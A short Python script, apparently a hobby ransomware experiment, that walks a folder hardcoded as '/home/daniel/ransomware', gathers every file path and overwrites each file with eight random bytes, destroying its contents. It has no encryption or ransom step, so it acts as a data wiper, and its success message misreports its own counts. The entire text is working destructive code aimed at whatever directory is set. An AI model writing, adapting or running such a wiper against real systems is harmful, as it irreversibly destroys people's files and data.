from os import walk
from random import randint

files = []

def generateBytes():
  randBytes = ''
  for x in range(0, 8):
    randBytes += str(randint(0, 1))
  
  return randBytes.encode()

def overwriteFiles():
  count = 0
  countBad = 0
  for f in files:
    try:
      with open(f, 'w+b') as f:
        newbytes = generateBytes()
        f.write(newbytes)
      count += 1
    except:
      countBad += 1
  if count > 0:
    print('[*] Sucessfully: {} of {} files'. format(count, str(count - countBad)))

def searchFiles(folder):
  count = 0
  for r, d, f in walk(folder):
    for file in f:
      files.append('{}/{}'.format(r, file))
      count += 1
  print('[*] Found {} files'.format(count))

if __name__ == "__main__":
  searchFiles('/home/daniel/ransomware')
  overwriteFiles()